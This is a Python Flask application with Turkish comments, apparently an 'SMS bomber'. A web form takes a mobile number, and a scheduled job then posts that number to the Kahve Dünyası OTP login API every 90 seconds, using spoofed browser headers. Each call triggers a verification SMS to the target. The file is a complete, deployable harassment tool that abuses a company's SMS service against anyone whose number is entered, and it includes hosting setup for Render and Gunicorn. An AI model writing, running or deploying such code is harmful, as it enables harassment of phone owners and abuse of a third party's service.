import os
import time
import requests
from flask import Flask, request, jsonify
from flask_apscheduler import APScheduler

# Flask Uygulama Yapılandırması
class Config:
    SCHEDULER_API_ENABLED = True

app = Flask(__name__)
app.config.from_object(Config())

scheduler = APScheduler()

# Aktif numaraları tutan sözlük
active_targets = {}

def send_kahve_dunyasi_sms(phone_number):
    """SMS Gönderim Fonksiyonu"""
    url = "https://api.kahvedunyasi.com/v1/login/otp"
    payload = {
        "mobile_number": phone_number,
        "channel": "sms"
    }
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Origin": "https://www.kahvedunyasi.com",
        "Referer": "https://www.kahvedunyasi.com/"
    }

    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        print(f"[{time.ctime()}] Numara: {phone_number} | Durum: {response.status_code}")
        return response.status_code
    except Exception as e:
        print(f"[{time.ctime()}] Hata: {e}")
        return None

# Zamanlayıcı Görevi (Her 90 saniyede bir)
@scheduler.task('interval', id='sms_job', seconds=90)
def scheduled_sms_job():
    if active_targets:
        print(f"--- Periyodik İşlem: {len(active_targets)} numara taranıyor ---")
        for phone_number in list(active_targets.keys()):
            send_kahve_dunyasi_sms(phone_number)

# --- ROUTE'LAR ---

@app.route('/')
def index():
    return """
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>SMS Motoru v2</title>
        <style>
            body { font-family: sans-serif; background: #121212; color: #eee; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .card { background: #1e1e1e; padding: 2rem; border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.5); width: 320px; text-align: center; border: 1px solid #333; }
            input { width: 100%; padding: 12px; margin: 1rem 0; background: #2b2b2b; border: 1px solid #444; color: #fff; border-radius: 6px; box-sizing: border-box; outline: none; }
            button { width: 100%; padding: 12px; background: #ff9f43; border: none; color: #121212; font-weight: bold; cursor: pointer; border-radius: 6px; transition: 0.3s; }
            button:hover { background: #e68a2e; }
            #status { margin-top: 1rem; font-size: 0.9rem; color: #00d2d3; min-height: 1.2rem; }
        </style>
    </head>
    <body>
        <div class="card">
            <h3>☕ SMS Motoru</h3>
            <p style="font-size: 0.8rem; color: #888;">90 saniye aralıkla gönderim yapar.</p>
            <input type="text" id="phone" placeholder="5XXXXXXXXX" maxlength="10">
            <button onclick="startMotor()">SİSTEMİ BAŞLAT</button>
            <div id="status"></div>
        </div>
        <script>
            function startMotor() {
                const phone = document.getElementById('phone').value;
                const statusDiv = document.getElementById('status');
                
                if(phone.length !== 10 || !phone.startsWith('5')) { 
                    alert("Lütfen geçerli bir numara girin (Örn: 532... - 10 hane)"); 
                    return; 
                }
                
                statusDiv.innerText = "İşlem başlatılıyor...";
                
                fetch('/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phone: phone})
                })
                .then(res => res.json())
                .then(data => {
                    statusDiv.innerText = data.message;
                })
                .catch(err => {
                    statusDiv.innerText = "Bağlantı hatası!";
                    console.error(err);
                });
            }
        </script>
    </body>
    </html>
    """

@app.route('/start', methods=['POST'])
def start():
    data = request.get_json()
    phone = data.get('phone')
    
    if phone and len(phone) == 10:
        active_targets[phone] = time.time()
        # İlkini hemen gönder
        send_kahve_dunyasi_sms(phone)
        return jsonify({"message": f"{phone} listeye eklendi."}), 200
    
    return jsonify({"message": "Hatalı numara!"}), 400

# --- SCHEDULER BAŞLATMA (RENDER/GUNICORN İÇİN EN SAĞLIKLI YER) ---
if not scheduler.running:
    scheduler.init_app(app)
    scheduler.start()

# Render PORT yönetimi
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
